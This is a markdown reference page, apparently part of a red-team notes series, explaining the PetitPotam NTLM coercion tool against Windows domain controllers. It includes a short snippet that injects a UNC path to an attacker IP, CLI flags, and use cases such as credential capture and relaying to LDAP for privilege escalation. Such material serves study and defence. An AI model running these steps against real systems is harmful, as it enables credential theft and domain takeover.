# PetitPotam — Overview

> 🔴 **Red Flag Principle:** PetitPotam is a **single, CVE-specific exploit** (CVE-2021-36942 / MS-EFSRPC) — unlike Coercer which aggregates multiple CVEs, PetitPotam does **one thing exceptionally well**: force EFS (Encrypting File System) to authenticate. The EFS RPC callback is the defining signature.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

PetitPotam was written by **TOPOTAM** (pseudonymous) and published under the `topotam77/PetitPotam` GitHub repository, licensed under **MIT**.

Verified against the live repository:

- **Initial release (2021-07)** — disclosure of CVE-2021-36942 (EFS RPC unauthenticated coercion) with working proof-of-concept.
- **Maintained through 2026** — stable implementation, minimal changes needed.

**Design philosophy:** PetitPotam is **not** a framework (like Coercer). It's a **focused exploit** for a single CVE. The entire tool is ~200 lines of Python; its simplicity is a strength (fewer bugs, easier to audit).

## How It Works

PetitPotam exploits **MS-EFSRPC** (Encrypting File System RPC) — specifically, the `EfsRpcEncryptFileSrv` RPC method, which a low-privilege or **even unauthenticated** user can call on a DC or file server.

### The EFS Coercion Flow

```
1. Attacker calls EfsRpcEncryptFileSrv RPC on target (DC or file server)
2. Method signature: EfsRpcEncryptFileSrv(
     <ENCRYPTED_FILE_REQUEST> with a UNC path pointing to attacker
   )
3. Target's EFS service processes the request
4. As part of EFS work, it needs to verify the UNC path
5. Target initiates SMB connection to attacker's IP at the specified UNC path
6. Target authenticates with its machine account (SYSTEM)
7. Attacker (via Responder/ntlmrelayx) captures/relays the NTLM hash
```

**Why unauthenticated:** The EFS RPC call does not require a specific privilege to invoke. A low-privilege domain user can call it. Some variants don't require even a domain account (depends on target's RPC permissions).

### UNC Path Injection

The key mechanism is a **UNC path embedded in the RPC request**:

```python
# Attacker's PetitPotam call (simplified):
request = EfsRpcEncryptFileSrvRequest()
request.FileName = "\\\\192.168.1.99\\share\\file.txt"  # Attacker's IP + share
```

When the target's EFS service tries to access this path, it initiates an SMB connection to the attacker, triggering authentication.

## Techniques / Protocols Used

| Protocol | Detail |
|---|---|
| **MS-EFSRPC** | Encrypting File System RPC — `EfsRpcEncryptFileSrv` method |
| **MS-SRVS** | Server Service RPC (less common variant) |
| **RPC/DCERPC** | Remote Procedure Call — binary RPC protocol over SMB |
| **SMB** | Server Message Block — UNC path connection (triggers auth) |
| **NTLM** | Challenge/response over SMB |

## Command-Line Switches — Quick Reference

PetitPotam's CLI is minimal (by design):

| Flag | Argument | Purpose |
|---|---|---|
| `-t TARGET` | IP or hostname | **Required**: target DC or file server |
| `-l LISTENER` | IP or hostname | **Required**: attacker's listening IP (where target connects) |
| `-u USER` | Username (optional) | Domain\user or user@domain for authenticated RPC binding (optional, many times unauthenticated works) |
| `-p PASSWORD` | Password (optional) | Password (or `-hashes` for hash auth) |
| `--port PORT` | Port | RPC port (default 135 / Endpoint Mapper) |
| `-v` | (none) | Verbose output |

**Simplicity note:** Unlike Coercer, PetitPotam has **no method selection** (`-co` flag). It does **only EFS**. Other variants (legacy, in forks) may add alternative methods, but upstream is EFS-only.

## Quick Use-Case List

1. **Unauthenticated coercion** — Call EFS without credentials (works against most DCs by default).
2. **Authenticated coercion** — Use valid domain creds for guaranteed RPC access (if unauthenticated fails).
3. **Low-privilege coercion** — User account sufficient; no admin needed.
4. **Batch coercion** — Loop through multiple targets, coerce each one.
5. **Firewall bypass** — RPC runs on dynamic port range (hard to firewall); UNC callback on 445 (often open).
6. **Credential capture** — Machine account ($) credentials via captured NTLM hash.
7. **Relay to DC / file server** — Coerce DC, relay captured auth to LDAP for privilege escalation.

## Prerequisites

1. **Network access to RPC endpoint** — Port 135 (Endpoint Mapper) or port 445 (if RPC-over-SMB).
2. **Listener running** — Responder or ntlmrelayx on attacker host.
3. **Attacker IP routable** — Target must reach attacker's IP to complete UNC path connection.
4. **EFS RPC method available** — Target must have EFS enabled (default on all modern Windows).
5. **Unauthenticated access (optional)** — Most targets allow unauthenticated EFS RPC calls; auth makes it more reliable.
6. **SMB port 445 open** — For the UNC callback (usually open).

---

**Next:** See `02 - Hands-On Use Cases.md`.
